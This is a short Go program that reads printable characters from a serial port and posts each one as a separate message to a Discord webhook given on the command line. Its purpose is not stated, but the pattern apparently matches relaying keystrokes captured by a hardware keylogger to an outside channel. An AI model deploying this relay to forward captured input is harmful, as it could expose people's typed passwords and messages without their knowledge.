package main

import (
  "bufio"; "bytes"; "encoding/json"
  "flag"; "fmt"; "net/http"; "os"
  "github.com/tarm/serial"
)

var (
  port    = flag.String("port", "", "e.g. COM3 or /dev/ttyACM0")
  webhook = flag.String("webhook", "", "Discord webhook URL")
)

func main() {
  flag.Parse()
  cfg := &serial.Config{Name: *port, Baud: 115200}
  s, err := serial.OpenPort(cfg)
  if err != nil { fmt.Println(err); os.Exit(1) }
  reader := bufio.NewReader(s)

  for {
    b, err := reader.ReadByte()
    if err != nil { break }
    if b < 32 || b > 126 { continue }
    body, _ := json.Marshal(map[string]string{"content": string(b)})
    http.Post(*webhook, "application/json", bytes.NewBuffer(body))
  }
}
